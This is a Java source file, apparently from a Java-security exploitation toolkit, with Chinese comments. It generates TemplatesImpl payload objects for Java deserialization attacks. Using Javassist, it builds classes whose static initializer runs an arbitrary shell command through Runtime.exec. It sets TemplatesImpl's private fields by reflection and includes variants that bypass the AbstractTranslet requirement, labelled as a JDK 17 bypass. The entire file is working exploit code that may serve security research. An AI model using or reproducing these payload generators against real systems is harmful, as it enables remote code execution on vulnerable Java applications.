package com.xyuxu.javasec.core.generator;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.xyuxu.javasec.utils.Reflections;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;


public class TemplatesBytecodeGenerator {

    /**
     * 动态生成继承自 AbstractTranslet 的恶意类字节码
     */
    public static byte[] createTemplatesImplExecBytes(String command) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        // 1. 创建一个全新的类
        CtClass cc = pool.makeClass("StubTransletPayload" + System.nanoTime());
        // 2. 设置父类为 AbstractTranslet
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        cc.setSuperclass(superClass);
        // 3. 创建 static 代码块，插入恶意命令
        String safeCommand = command.replace("\\", "\\\\").replace("\"", "\\\"");
        String staticBlock = "java.lang.Runtime.getRuntime().exec(\"" + safeCommand + "\");";
        cc.makeClassInitializer().setBody("{" + staticBlock + "}");
        cc.getClassFile().setMajorVersion(javassist.bytecode.ClassFile.JAVA_8);
        // 4. 实现 AbstractTranslet 的两个抽象方法
        String method1 = "public void transform(" + DOM.class.getName() + " document, " + SerializationHandler.class.getName() + "[] handlers) throws " + TransletException.class.getName() + " {}";
        String method2 = "public void transform(" + DOM.class.getName() + " document, " + DTMAxisIterator.class.getName() + " iterator, " + SerializationHandler.class.getName() + " handler) throws " + TransletException.class.getName() + " {}";
        cc.addMethod(CtMethod.make(method1, cc));
        cc.addMethod(CtMethod.make(method2, cc));
        byte[] bytes = cc.toBytecode();
        cc.detach();
        return bytes;
    }

    public static byte[] createTemplatesImplExecBytesNoSuper(String command) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        // 1. 创建一个全新的类
        CtClass cc = pool.makeClass("StubTransletPayload" + System.nanoTime());
        // 2. 核心：创建 static 代码块
        String safeCommand = command.replace("\\", "\\\\").replace("\"", "\\\"");
        String staticBlock = "java.lang.Runtime.getRuntime().exec(\"" + safeCommand + "\");";
        cc.makeClassInitializer().setBody("{" + staticBlock + "}");
        cc.getClassFile().setMajorVersion(javassist.bytecode.ClassFile.JAVA_8);
        byte[] bytes = cc.toBytecode();
        cc.detach();
        return bytes;
    }

    public static TemplatesImpl createTemplatesImpl(final String command) throws Exception {

        byte[] evilBytecode = createTemplatesImplExecBytes(command);
        final TemplatesImpl templates = new TemplatesImpl();

        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{evilBytecode});
        Reflections.setFieldValue(templates, "_name", "foo" + System.nanoTime());
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        return templates;
    }


    public static TemplatesImpl createTemplatesImplBypassJDK17(final String command) throws Exception {

        // 1. 生成恶意类
        byte[] evilBytecode = createTemplatesImplExecBytesNoSuper(command);
        // 2. 生成一个无害的占位类
        ClassPool pool = ClassPool.getDefault();
        CtClass tempClass = pool.makeClass("Placeholder" + System.nanoTime());
        tempClass.getClassFile().setMajorVersion(javassist.bytecode.ClassFile.JAVA_8);
        byte[] tempBytecode = tempClass.toBytecode();
        tempClass.detach();
        //3.绕过需要继承AbstractTranslet
        final TemplatesImpl templates = new TemplatesImpl();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{ evilBytecode, tempBytecode });
        Reflections.setFieldValue(templates, "_name", "Pwn" + System.nanoTime());
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Reflections.setFieldValue(templates, "_transletIndex", 0);
        return templates;

    }


    public static TemplatesImpl createTemplatesImplWithBytecode(byte[] classBytes) throws Exception {
        final TemplatesImpl templates = new TemplatesImpl();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        Reflections.setFieldValue(templates, "_name", "Pwn" + System.nanoTime());
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }

    public static TemplatesImpl createTemplatesImplWithBytecodeBypassJDK17(byte[] classBytes) throws Exception {

        // 1. 生成一个无害的占位类
        ClassPool pool = ClassPool.getDefault();
        CtClass tempClass = pool.makeClass("Placeholder" + System.nanoTime());
        tempClass.getClassFile().setMajorVersion(javassist.bytecode.ClassFile.JAVA_8);
        byte[] tempBytecode = tempClass.toBytecode();
        tempClass.detach();
        final TemplatesImpl templates = new TemplatesImpl();
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{ classBytes, tempBytecode });
        Reflections.setFieldValue(templates, "_name", "Pwn" + System.nanoTime());
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Reflections.setFieldValue(templates, "_transletIndex", 0);
        return templates;

    }

}